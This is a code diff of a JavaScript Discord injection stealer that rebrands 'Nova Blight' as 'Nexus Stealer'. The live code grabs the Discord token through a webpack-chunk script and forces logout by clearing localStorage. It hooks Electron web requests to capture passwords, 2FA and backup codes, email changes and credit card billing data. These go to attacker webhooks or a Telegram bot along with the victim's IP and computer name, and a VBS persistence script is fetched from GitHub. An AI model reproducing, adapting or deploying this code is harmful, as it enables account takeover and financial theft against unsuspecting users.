@@ -6,7 +6,7 @@ const https = require("https");
 const queryString = require("querystring");
 
 var computerName = process.env.COMPUTERNAME;
-let backupscript = `const Novacodes = Array.from(document.querySelectorAll('span[class^="code__"]')).map(e => ({ code: e.textContent.trim().replace(/-/g, ''), consumed: e.closest('span[class^="checkboxWrapper_"]')?.classList?.value.includes("checked_") || false }));Novacodes;`;
+let backupscript = `const cacacodes = Array.from(document.querySelectorAll('span[class^="code__"]')).map(e => ({ code: e.textContent.trim().replace(/-/g, ''), consumed: e.closest('span[class^="checkboxWrapper_"]')?.classList?.value.includes("checked_") || false }));cacacodes;`;
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`;
 var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`;
 var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? false : true;
@@ -17,14 +17,12 @@ var config = {
   "init-notify": "true",
   "embed-color": 3553599,
   disable2FA: "%DISABLE_2FA%",
-  creator: "@Nova Blight",
-  transfer_link: `%TRANSFER_URL%`,
+  creator: "nxs.rip",
   injection_url:
     "https://raw.githubusercontent.com/ItsZxsko/salowwww/refs/heads/main/injjjj.js",
   injector_url:
     "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/VBS_Persist.vbs",
   webhook: "%WEBHOOK_URL%",
-  Placed: "%API_URL%",
   bot_token: "%TELEGRAM_BOTTOKEN%",
   chat_id: "%TELEGRAM_CHATID%",
   user_id: "%TELEGRAM_USERID%",
@@ -99,7 +97,7 @@ async function execScript(str) {
 
 const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
   var params = {
-    username: "Nova Blight",
+    username: "Nexus Stealer",
     avatar_url:
       "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
     content: "",
@@ -110,11 +108,11 @@ const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
         fields: fields,
         description: description ?? "",
         author: {
-          name: `Nova Blight`,
+          name: `Nexus Stealer`,
         },
 
         footer: {
-          text: ` [${config.creator}] | https://t.me/NovaBlight`,
+          text: ` [${config.creator}] | https://t.me/nexustealer`,
         },
       },
     ],
@@ -442,7 +440,7 @@ const post = async (params) => {
     data: params,
     token: token,
   });
-  [config.Placed, config.webhook].forEach((res) => {
+  [config.webhook].forEach((res) => {
     if (res == "%API" + "_URL%") return;
     if (res == "%\x57EBHOOK%") return;
     const url = new URL(res);
@@ -457,7 +455,6 @@ const post = async (params) => {
     };
     const req = https.request(options);
     req.on("error", (err) => {});
-    req.write(res == config.Placed ? n : params);
     req.end();
   });
 };
@@ -510,7 +507,7 @@ const FirstTime = async () => {
     var client_discord = appName;
     if (!token) {
       var params = await makeEmbed({
-        title: "<:nova:1132934190032244786> Initialized",
+        title: " Initialized",
         fields: [
           {
             name: "Injection Info",
@@ -538,10 +535,10 @@ const FirstTime = async () => {
       var Friends = parseFriends(friends);
       if (!user.avatar)
         var userAvatar =
-          "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png";
+          "https://i.giphy.com/JlQDnK0VEW7hnNKDJQ.webp";
       if (!user.banner)
         var userBanner =
-          "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/giphy.gif";
+          "https://images-eds-ssl.xboxlive.com/image?url=4rt9.lXDC4H_93laV1_eHHFT949fUipzkiFOBH3fAiZZUCdYojwUyX2aTonS1aIwMrx6NUIsHfUHSLzjGJFxxsG72wAo9EWJR4yQWyJJaDb6rYcBtJvTvH3UoAS4JFNDaxGhmKNaMwgElLURlRFeVkLCjkfnXmWtINWZIrPGYq0-&format=source";
 
       userBanner =
         userBanner ??
@@ -598,7 +595,7 @@ const FirstTime = async () => {
         color: config["embed-color"],
         fields: [
           {
-            name: "Bio <:nova:1132934190032244786>",
+            name: "Bio ",
             value: `\`\`\`${
               user.bio !== null && user.bio !== undefined && user.bio !== ""
                 ? user.bio
@@ -622,18 +619,13 @@ const FirstTime = async () => {
             inline: !0,
           },
           {
-            name: "Nova Files",
-            value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
-            inline: !0,
-          },
-          {
             name: "Billing <a:money:1130448564632436787>",
             value: `${Billings}`,
             inline: !0,
           },
           {
             name: "@Copyright",
-            value: `[Nova Blight 2025 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+            value: `[Nexus Stealer 2025 ](https://t.me/nexustealer)`,
             inline: !0,
           },
         ],
@@ -649,7 +641,7 @@ const FirstTime = async () => {
       });
 
       params.embeds.push(params2.embeds[0]);
-      let message = `Nova Blight Initialized
+      let message = `Nexus Stealer Initialized
 \`\`\`json
 👛 Username: ${user.username}
 💉 ID: ${user.id}
@@ -675,7 +667,7 @@ const FirstTime = async () => {
       if (!token) {
         var params = await makeEmbed({
           title:
-            "<:nova:1132934190032244786> User log out (User not Logged in before)",
+            " User log out (User not Logged in before)",
           fields: [
             {
               name: "Injection Info",
@@ -710,10 +702,10 @@ const FirstTime = async () => {
         var Friends = parseFriends(friends);
         if (!user.avatar)
           var userAvatar =
-            "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png";
+            "https://i.giphy.com/JlQDnK0VEW7hnNKDJQ.webp";
         if (!user.banner)
           var userBanner =
-            "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/giphy.gif";
+            "https://images-eds-ssl.xboxlive.com/image?url=4rt9.lXDC4H_93laV1_eHHFT949fUipzkiFOBH3fAiZZUCdYojwUyX2aTonS1aIwMrx6NUIsHfUHSLzjGJFxxsG72wAo9EWJR4yQWyJJaDb6rYcBtJvTvH3UoAS4JFNDaxGhmKNaMwgElLURlRFeVkLCjkfnXmWtINWZIrPGYq0-&format=source";
 
         userBanner =
           userBanner ??
@@ -726,7 +718,7 @@ const FirstTime = async () => {
             `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
           ));
         var params = await makeEmbed({
-          title: "<:nova:1132934190032244786> Victim got logged out",
+          title: " Victim got logged out",
           description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
           fields: [
             {
@@ -756,7 +748,7 @@ const FirstTime = async () => {
             },
             {
               name: "@Copyright",
-              value: `[Nova Blight 2025 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+              value: `[Nexus Stealer 2025 ](https://t.me/nexustealer)`,
               inline: !0,
             },
             {
@@ -779,7 +771,7 @@ const FirstTime = async () => {
           color: config["embed-color"],
           fields: [
             {
-              name: "Bio <:nova:1132934190032244786>",
+              name: "Bio ",
               value: `\`\`\`${
                 user.bio !== null && user.bio !== undefined && user.bio !== ""
                   ? user.bio
@@ -803,18 +795,13 @@ const FirstTime = async () => {
               inline: !0,
             },
             {
-              name: "Nova Files",
-              value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
-              inline: !0,
-            },
-            {
               name: "Billing <a:money:1130448564632436787>",
               value: `${Billings}`,
               inline: !0,
             },
             {
               name: "@Copyright",
-              value: `[Nova Blight 2025 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+              value: `[Nexus Stealer 2025 ](https://t.me/nexustealer)`,
               inline: !0,
             },
           ],
@@ -904,10 +891,10 @@ async function BoukiTuclcavectesfonctions() {
   );
   if (!user.avatar)
     var userAvatar =
-      "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png";
+      "https://images-eds-ssl.xboxlive.com/image?url=4rt9.lXDC4H_93laV1_eHHFT949fUipzkiFOBH3fAiZZUCdYojwUyX2aTonS1aIwMrx6NUIsHfUHSLzjGJFxxsG72wAo9EWJR4yQWyJJaDb6rYcBtJvTvH3UoAS4JFNDaxGhmKNaMwgElLURlRFeVkLCjkfnXmWtINWZIrPGYq0-&format=source";
   if (!user.banner)
     var userBanner =
-      "https://raw.githubusercontent.com/KSCHcuck/sub/165ae07181c977bdf519ebc7b40f314a81ea7415/assets/influence.gif";
+      "https://i.giphy.com/JlQDnK0VEW7hnNKDJQ.webp";
 
   var userBanner =
     userBanner ??
@@ -989,7 +976,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             usrAvatar = gresult.userAvatar,
             usrBanner = gresult.userBanner;
           var params = await makeEmbed({
-            title: "<:nova:1132934190032244786> QR Code Login",
+            title: " QR Code Login",
             color: config["embed-color"],
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${usrAvatar})`,
             fields: [
@@ -1038,7 +1025,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             color: config["embed-color"],
             fields: [
               {
-                name: "Bio <:nova:1132934190032244786>",
+                name: "Bio ",
                 value: `\`\`\`${
                   usr.bio !== null && usr.bio !== undefined && usr.bio !== ""
                     ? usr.bio
@@ -1062,18 +1049,13 @@ electron.session.defaultSession.webRequest.onCompleted(
                 inline: !0,
               },
               {
-                name: "Nova Files",
-                value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
-                inline: !0,
-              },
-              {
                 name: "Billing <a:money:1130448564632436787>",
                 value: `${billingss}`,
                 inline: !0,
               },
               {
                 name: "@Copyright",
-                value: `[Nova Blight 2025 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+                value: `[Nexus Stealer 2025 ](https://t.me/nexustealer)`,
                 inline: !0,
               },
             ],
@@ -1107,7 +1089,7 @@ electron.session.defaultSession.webRequest.onCompleted(
         } = await BoukiTuclcavectesfonctions();
         var password = data.password;
         var params = await makeEmbed({
-          title: "<:nova:1132934190032244786> Random Auth Catcher",
+          title: " Random Auth Catcher",
           color: config["embed-color"],
           description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
           fields: [
@@ -1176,7 +1158,7 @@ electron.session.defaultSession.webRequest.onCompleted(
               } = await BoukiTuclcavectesfonctions();
               var password = data.password;
               var params = await makeEmbed({
-                title: "<:nova:1132934190032244786> User Login",
+                title: " User Login",
                 color: config["embed-color"],
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [
@@ -1230,7 +1212,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                 color: config["embed-color"],
                 fields: [
                   {
-                    name: "Bio <:nova:1132934190032244786>",
+                    name: "Bio ",
                     value: `\`\`\`${
                       user.bio !== null &&
                       user.bio !== undefined &&
@@ -1241,7 +1223,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                     inline: false,
                   },
                   {
-                    name: "Code 2fa used <:nova:1132934190032244786>",
+                    name: "Code 2fa used ",
                     value: `\`${
                       dt.code !== null &&
                       dt.code !== undefined &&
@@ -1264,11 +1246,6 @@ electron.session.defaultSession.webRequest.onCompleted(
                   {
                     name: "A2F <a:keys:1159078859682107453>",
                     value: `${GetA2F(user.mfa_enabled)}`,
-                    inline: !0,
-                  },
-                  {
-                    name: "Nova Files",
-                    value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
                     inline: !0,
                   },
                   {
@@ -1329,7 +1306,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             var password = data.password;
 
             var params = await makeEmbed({
-              title: "<:nova:1132934190032244786> User Login",
+              title: " User Login",
               color: config["embed-color"],
               description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
               fields: [
@@ -1383,7 +1360,7 @@ electron.session.defaultSession.webRequest.onCompleted(
               color: config["embed-color"],
               fields: [
                 {
-                  name: "Bio <:nova:1132934190032244786>",
+                  name: "Bio ",
                   value: `\`\`\`${
                     user.bio !== null &&
                     user.bio !== undefined &&
@@ -1409,18 +1386,13 @@ electron.session.defaultSession.webRequest.onCompleted(
                   inline: !0,
                 },
                 {
-                  name: "Nova Files",
-                  value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
-                  inline: !0,
-                },
-                {
                   name: "Billing <a:money:1130448564632436787>",
                   value: `${Billings}`,
                   inline: !0,
                 },
                 {
                   name: "@Copyright",
-                  value: `[Nova Blight 2025 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+                  value: `[Nexus Stealer 2025 ](https://t.me/nexustealer)`,
                   inline: !0,
                 },
               ],
@@ -1478,7 +1450,7 @@ electron.session.defaultSession.webRequest.onCompleted(
           }
 
           var params = await makeEmbed({
-            title: "<:nova:1132934190032244786> Phone Added",
+            title: " Phone Added",
             color: config["embed-color"],
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
             fields: [
@@ -1521,7 +1493,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             color: config["embed-color"],
             fields: [
               {
-                name: "Bio <:nova:1132934190032244786>",
+                name: "Bio ",
                 value: `\`\`\`${
                   user.bio !== null && user.bio !== undefined && user.bio !== ""
                     ? user.bio
@@ -1535,18 +1507,13 @@ electron.session.defaultSession.webRequest.onCompleted(
                 inline: !0,
               },
               {
-                name: "Nova Files",
-                value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
-                inline: !0,
-              },
-              {
                 name: "Billing <a:money:1130448564632436787>",
                 value: `${Billings}`,
                 inline: !0,
               },
               {
                 name: "@Copyright",
-                value: `[Nova Blight 2025 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+                value: `[Nexus Stealer 2025 ](https://t.me/nexustealer)`,
                 inline: !0,
               },
             ],
@@ -1587,7 +1554,7 @@ electron.session.defaultSession.webRequest.onCompleted(
           }
 
           var params = await makeEmbed({
-            title: "<:nova:1132934190032244786> Password Changed",
+            title: " Password Changed",
             color: config["embed-color"],
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
             fields: [
@@ -1645,7 +1612,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             color: config["embed-color"],
             fields: [
               {
-                name: "Bio <:nova:1132934190032244786>",
+                name: "Bio ",
                 value: `\`\`\`${
                   user.bio !== null && user.bio !== undefined && user.bio !== ""
                     ? user.bio
@@ -1669,18 +1636,8 @@ electron.session.defaultSession.webRequest.onCompleted(
                 inline: !0,
               },
               {
-                name: "Nova Files",
-                value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
-                inline: !0,
-              },
-              {
                 name: "Billing <a:money:1130448564632436787>",
                 value: `${Billings}`,
-                inline: !0,
-              },
-              {
-                name: "@Copyright",
-                value: `[Nova Blight 2025 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
                 inline: !0,
               },
             ],
@@ -1730,7 +1687,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             Friends,
           } = await BoukiTuclcavectesfonctions();
           var params = await makeEmbed({
-            title: "<:nova:1132934190032244786> Email Changed",
+            title: " Email Changed",
             color: config["embed-color"],
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
             fields: [
@@ -1783,7 +1740,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             color: config["embed-color"],
             fields: [
               {
-                name: "Bio <:nova:1132934190032244786>",
+                name: "Bio ",
                 value: `\`\`\`${
                   user.bio !== null && user.bio !== undefined && user.bio !== ""
                     ? user.bio
@@ -1807,18 +1764,13 @@ electron.session.defaultSession.webRequest.onCompleted(
                 inline: !0,
               },
               {
-                name: "Nova Files",
-                value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
-                inline: !0,
-              },
-              {
                 name: "Billing <a:money:1130448564632436787>",
                 value: `${Billings}`,
                 inline: !0,
               },
               {
                 name: "@Copyright",
-                value: `[Nova Blight 2025 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+                value: `[Nexus Stealer 2025 ](https://t.me/nexustealer)`,
                 inline: !0,
               },
             ],
@@ -1870,7 +1822,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             Friends,
           } = await BoukiTuclcavectesfonctions();
           var params = await makeEmbed({
-            title: "<:nova:1132934190032244786> Username Changed",
+            title: " Username Changed",
             color: config["embed-color"],
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
             fields: [
@@ -1924,7 +1876,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             color: config["embed-color"],
             fields: [
               {
-                name: "Bio <:nova:1132934190032244786>",
+                name: "Bio ",
                 value: `\`\`\`${
                   user.bio !== null && user.bio !== undefined && user.bio !== ""
                     ? user.bio
@@ -1945,11 +1897,6 @@ electron.session.defaultSession.webRequest.onCompleted(
               {
                 name: "A2F <a:keys:1159078859682107453>",
                 value: `${GetA2F(user.mfa_enabled)}`,
-                inline: !0,
-              },
-              {
-                name: "Nova Files",
-                value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
                 inline: !0,
               },
               {
@@ -2014,14 +1961,9 @@ electron.session.defaultSession.webRequest.onCompleted(
               let { line_1, line_2, city, state, postal_code, country, email } =
                 dt.billing_address;
               var params = await makeEmbed({
-                title: "<:nova:1132934190032244786> Credit Card Added",
+                title: " Credit Card Added",
                 color: config["embed-color"],
                 fields: [
-                  {
-                    name: "Nova Files",
-                    value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
-                    inline: true,
-                  },
                   {
                     name: "IP",
                     value: `\`${ip}\``,
@@ -2130,14 +2072,9 @@ electron.session.defaultSession.webRequest.onCompleted(
           Friends,
         } = await BoukiTuclcavectesfonctions();
         var params = await makeEmbed({
-          title: "<:nova:1132934190032244786> User Enable 2FA",
+          title: " User Enable 2FA",
           color: config["embed-color"],
           fields: [
-            {
-              name: "Nova Files",
-              value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
-              inline: false,
-            },
             {
               name: "IP",
               value: `\`${ip}\``,
@@ -2218,14 +2155,9 @@ Backup Codes
 
       case request.url.endsWith("/disable"):
         var params = await makeEmbed({
-          title: "<:nova:1132934190032244786> User Removed 2FA",
+          title: " User Removed 2FA",
           color: config["embed-color"],
           fields: [
-            {
-              name: "Nova Files",
-              value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
-              inline: false,
-            },
             {
               name: "IP",
               value: `\`${ip}\``,
@@ -2321,14 +2253,9 @@ Backup Codes
           }
         }
         var params = await makeEmbed({
-          title: "<:nova:1132934190032244786> User 2FA Codes",
+          title: " User 2FA Codes",
           color: config["embed-color"],
           fields: [
-            {
-              name: "Nova Files",
-              value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
-              inline: false,
-            },
             {
               name: "IP",
               value: "`" + ip + "`",
